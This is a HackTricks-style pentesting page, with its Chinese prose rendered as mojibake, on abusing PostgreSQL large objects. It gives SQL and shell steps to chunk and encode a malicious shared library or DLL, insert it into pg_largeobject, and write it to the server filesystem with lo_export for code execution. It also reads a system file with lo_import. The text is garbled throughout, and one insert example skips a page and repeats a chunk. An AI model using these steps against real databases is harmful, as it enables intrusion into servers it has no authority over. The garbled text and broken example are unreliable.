<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


# PostgreSQLå¤§å‹å¯¹è±¡

PostgreSQLæä¾›äº†ä¸€ç§ç§°ä¸º**å¤§å‹å¯¹è±¡ï¼ˆlarge objectï¼‰**çš„ç»“æ„ï¼Œç”¨äºå­˜å‚¨éš¾ä»¥å®Œæ•´å¤„ç†çš„æ•°æ®ï¼ˆå¦‚å›¾åƒæˆ–PDFæ–‡æ¡£ï¼‰ã€‚ä¸`COPY TO`å‡½æ•°ç›¸åï¼Œ**å¤§å‹å¯¹è±¡**çš„ä¼˜åŠ¿åœ¨äºå®ƒä»¬æ‰€æŒæœ‰çš„**æ•°æ®**å¯ä»¥ä½œä¸º**åŸå§‹å¯¼å…¥æ–‡ä»¶çš„å®Œå…¨å‰¯æœ¬**å¯¼å‡ºå›**æ–‡ä»¶ç³»ç»Ÿ**ã€‚

ä¸ºäº†å°†**å®Œæ•´æ–‡ä»¶ä¿å­˜åœ¨æ­¤è¡¨ä¸­**ï¼Œæ‚¨é¦–å…ˆéœ€è¦åœ¨ä¸Šè¿°è¡¨ä¸­**åˆ›å»ºä¸€ä¸ªå¯¹è±¡**ï¼ˆç”±**LOID**æ ‡è¯†ï¼‰ï¼Œç„¶ååœ¨æ­¤å¯¹è±¡ä¸­**æ’å…¥2KBçš„å—**ã€‚éå¸¸é‡è¦çš„æ˜¯ï¼Œæ‰€æœ‰çš„**å—éƒ½æœ‰2KB**ï¼ˆé™¤äº†å¯èƒ½çš„æœ€åä¸€ä¸ªï¼‰**æˆ–è€…**å¯¼å‡ºåˆ°æ–‡ä»¶ç³»ç»Ÿçš„**å‡½æ•°å°†æ— æ³•å·¥ä½œ**ã€‚

ä¸ºäº†å°†æ‚¨çš„**äºŒè¿›åˆ¶æ–‡ä»¶**æ‹†åˆ†ä¸º**2KBå¤§å°çš„å—**ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
ä¸ºäº†å°†åˆ›å»ºçš„æ¯ä¸ªæ–‡ä»¶ç¼–ç ä¸ºBase64æˆ–Hexï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
åœ¨åˆ©ç”¨æ­¤æ¼æ´æ—¶ï¼Œè¯·è®°ä½æ‚¨å¿…é¡»å‘é€**2KBæ˜æ–‡å­—èŠ‚çš„å—**ï¼ˆè€Œä¸æ˜¯2KBçš„base64æˆ–åå…­è¿›åˆ¶ç¼–ç å­—èŠ‚ï¼‰ã€‚å¦‚æœæ‚¨å°è¯•è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼Œåˆ™**åå…­è¿›åˆ¶ç¼–ç **æ–‡ä»¶çš„å¤§å°æ˜¯**ä¸¤å€**ï¼ˆå› æ­¤æ‚¨éœ€è¦ä¸ºæ¯ä¸ªå—å‘é€4KBçš„ç¼–ç æ•°æ®ï¼‰ï¼Œè€Œ**base64**ç¼–ç æ–‡ä»¶çš„å¤§å°ä¸º`ceil(n / 3) * 4`ã€‚
{% endhint %}

æ­¤å¤–ï¼Œæ‚¨å¯ä»¥é€šè¿‡è°ƒè¯•è¿‡ç¨‹æŸ¥çœ‹åˆ›å»ºçš„å¤§å‹å¯¹è±¡çš„å†…å®¹ï¼š
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# ä½¿ç”¨ lo_creat å’Œ Base64

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª LOIDï¼Œç”¨äºä¿å­˜äºŒè¿›åˆ¶æ•°æ®ï¼š
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
å¦‚æœä½ æ­£åœ¨æ»¥ç”¨**ç›²æ³¨**ï¼Œä½ ä¼šæ›´æ„Ÿå…´è¶£ä½¿ç”¨`lo_create`å’Œ**å›ºå®šçš„LOID**ï¼Œè¿™æ ·ä½ å°±**çŸ¥é“**ä½ éœ€è¦**ä¸Šä¼ **å†…å®¹çš„ä½ç½®ã€‚\
å¦å¤–ï¼Œè¯·æ³¨æ„ï¼Œå‡½æ•°çš„åç§°æ˜¯`lo_creat`å’Œ`lo_create`ï¼Œæ²¡æœ‰è¯­æ³•é”™è¯¯ã€‚

LOIDç”¨äºåœ¨`pg_largeobject`è¡¨ä¸­æ ‡è¯†å¯¹è±¡ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å°†å¤§å°ä¸º2KBçš„å—æ’å…¥åˆ°`pg_largeobject`è¡¨ä¸­ï¼š
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
æœ€åï¼Œæ‚¨å¯ä»¥å°†æ–‡ä»¶å¯¼å‡ºåˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ä½¿ç”¨çš„LOIDä¸º`173454`ï¼‰ï¼š
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬çš„PostgreSQLä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦**ä¸Šä¼ æ‰©å±•ç¨‹åºè€Œä¸æŒ‡å®šä»»ä½•è·¯å¾„**ã€‚[**é˜…è¯»æ­¤å¤„è·å–æ›´å¤šä¿¡æ¯**](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

æ‚¨å¯èƒ½æœ‰å…´è¶£åœ¨å¯¼å‡ºå¤§å‹å¯¹è±¡ååˆ é™¤å®ƒï¼š
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# ä½¿ç”¨ lo\_import å’Œ Hex

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†ä½¿ç”¨ lo\_import æ¥åˆ›å»ºä¸€ä¸ªå¤§å‹å¯¹è±¡ã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ï¼ˆä¹Ÿå¯ä»¥ï¼‰æŒ‡å®šè¦ä½¿ç”¨çš„ LOIDï¼š
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
åˆ›å»ºå¯¹è±¡åï¼Œæ‚¨å¯ä»¥å¼€å§‹åœ¨æ¯ä¸ªé¡µé¢ä¸Šæ’å…¥æ•°æ®ï¼ˆè¯·è®°ä½ï¼Œæ‚¨å¿…é¡»æ’å…¥2KBçš„æ•°æ®å—ï¼‰ï¼š
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEXå¿…é¡»åªåŒ…å«åå…­è¿›åˆ¶ï¼ˆä¸åŒ…æ‹¬`0x`æˆ–`\x`ï¼‰ï¼Œä¾‹å¦‚ï¼š
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
æœ€åï¼Œå°†æ•°æ®å¯¼å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶åˆ é™¤å¤§å¯¹è±¡ï¼š
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
æ³¨æ„ï¼Œåœ¨æœ€æ–°ç‰ˆæœ¬çš„PostgreSQLä¸­ï¼Œæ‚¨å¯èƒ½éœ€è¦**ä¸Šä¼ æ‰©å±•è€Œä¸æŒ‡å®šä»»ä½•è·¯å¾„**ã€‚[**é˜…è¯»æ­¤å¤„è·å–æ›´å¤šä¿¡æ¯**](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# é™åˆ¶

åœ¨é˜…è¯»PostgreSQLä¸­çš„å¤§å¯¹è±¡æ–‡æ¡£åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°**å¤§å¯¹è±¡å¯ä»¥æœ‰ACL**ï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ã€‚å¯ä»¥é…ç½®**æ–°çš„å¤§å¯¹è±¡**ï¼Œä½¿å¾—æ‚¨çš„ç”¨æˆ·**æ²¡æœ‰è¶³å¤Ÿçš„æƒé™**æ¥è¯»å–å®ƒä»¬ï¼Œå³ä½¿å®ƒä»¬æ˜¯ç”±æ‚¨çš„ç”¨æˆ·åˆ›å»ºçš„ã€‚

ç„¶è€Œï¼Œå¯èƒ½å­˜åœ¨**å…·æœ‰å…è®¸å½“å‰ç”¨æˆ·è¯»å–çš„ACLçš„æ—§å¯¹è±¡**ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ³„éœ²è¯¥å¯¹è±¡çš„å†…å®¹ã€‚


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
